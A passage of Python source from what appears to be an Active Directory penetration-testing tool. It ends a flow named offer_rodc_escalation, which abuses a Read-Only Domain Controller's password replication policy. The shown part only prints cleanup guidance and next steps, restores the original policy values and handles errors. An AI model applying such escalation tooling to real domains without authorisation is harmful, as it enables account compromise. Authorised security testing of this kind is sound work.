                            fallback_host=normalized_machine.rstrip("$"),
                        ),
                        target_user=target_user,
                        cleanup_completed=True,
                    )
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_info_debug(f"[rodc] failed to render PRP next steps: {exc}")
            else:
                _print_rodc_cleanup_manual_guidance(
                    domain=domain,
                    rodc_machine=normalized_machine,
                    reveal_values=original_reveal_values,
                    never_reveal_values=original_never_reveal_values,
                )
                try:
                    _print_rodc_prp_next_steps(
                        host=_first_hostname_candidate(
                            assessment,
                            fallback_host=normalized_machine.rstrip("$"),
                        ),
                        target_user=target_user,
                        cleanup_completed=False,
                    )
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    print_info_debug(f"[rodc] failed to render PRP next steps: {exc}")
        try:
            execute_cleanup_scope(shell, scope_id=cleanup_scope_id)
        finally:
            discard_cleanup_scope(shell, scope_id=cleanup_scope_id)


__all__ = ["offer_rodc_escalation"]
